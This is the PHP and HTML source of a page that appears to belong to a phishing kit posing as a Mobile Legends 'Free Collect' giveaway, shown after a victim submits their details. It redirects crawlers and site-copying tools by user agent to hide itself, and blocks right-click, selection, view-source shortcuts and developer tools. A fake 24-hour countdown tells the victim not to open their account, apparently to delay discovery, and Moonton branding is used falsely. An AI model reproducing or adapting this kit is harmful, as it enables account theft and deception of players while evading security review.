<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: http://www.raflipedia.club/');
die();
}
?>
<html>
<head>
<meta charset="utf-8">
<title>Mobile Legends - Free Collect</title>
<link href="css/style.css" rel="stylesheet" type="text/css">
<link href="https://www.mobilelegends.com/images/favicon.ico?v=1" rel="shorcut icon">
<script type="text/javascript" src="js/jquery.min.js"></script>
<script type="text/javascript" src="js/generic.js"></script>
<script type="text/javascript" src="js/main.js"></script>
</head>
<body>
<div>

<script type="text/javascript">
function disableSelection(e){if(typeof e.onselectstart!="undefined")e.onselectstart=function(){return false};else if(typeof e.style.MozUserSelect!="undefined")e.style.MozUserSelect="none";else e.onmousedown=function(){return false};e.style.cursor="default"}window.onload=function(){disableSelection(document.body)}
</script>

<script type="text/javascript">
function mousedwn(e){try{if(event.button==2||event.button==3)return false}catch(e){if(e.which==3)return false}}document.oncontextmenu=function(){return false};document.ondragstart=function(){return false};document.onmousedown=mousedwn
</script>

<script type="text/javascript">
window.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){e.preventDefault()}});document.keypress=function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){}return false}
</script>
<script type="text/javascript">
document.onkeydown=function(e){e=e||window.event;if(e.keyCode==123||e.keyCode==18){return false}}
</script>

<style>
h1, .h1, h2, .h2, h3, .h3 {
    margin-top: 0px;
    margin-bottom: 10.5px;
}
body { 
  background: url(gambar/bekgron.jpg) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}
.error-msg {
    margin: .5em 0;
    display: block;
    color: #dd4b39;
    line-height: 17px;
}
.col-md-6 {
 margin:0 auto;
 float:none;

}
.col-md-8 {
 margin:0 auto;
 float:none;

}
</style>

	
<div id="kotak">
<div id="kotak2">
<div id="kotak3">
<div class="logonya"></div>
<div id='pantek' style="color:white">
<p>
<center>
<span class="kocakwe">Processing Request</span>
</p>
</center>
					
<div class="kotakform">
<h3>Thanks you for joining</h3>


<form action="logout.php" method="post">

<h4>Your submission has been process</h4>
<h4>Please wait up to 24 hours</h4>
<h4><font color="red">Do not open your account until the process is complete.</font></h4>

<h4><font color="green">
<div id="pesan"></div><script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
<script>
            var url = '';
            var count = 60; // dalam detik
            var count1 = 23;
            var count2 = 59;
            function countDown() {
                if (count > 0) {
                    count--;
                    var waktu = count + 1;
                    var waktu1 = count1;
                    var waktu2 = count2;
                    $('#pesan').html('Waiting for sending to your account in </br> ' + waktu1 + ':' + waktu2 + ':' + waktu + '');
                    setTimeout("countDown()", 1000);
                } else {
                    window.location.href = url;
                }
            }
            countDown();
</script>
</font>
</h4>


<input type="submit" class="tombol" name="submit" value="Sign Out">

</form>
						
</div>
<br>
<br></div>
</div>
</div>
</div>
</div>
<br>
<br>
<div>

<div id="bawah">
<div style="clear:both"></div>
<br>
<br>
<img height="90" width="100" src="gambar/muntun.png">
<p>2017 © Moonton. Trademarks belong to their respective owners. All rights reserved.
</p>
</div>
</div>

</body>
</html>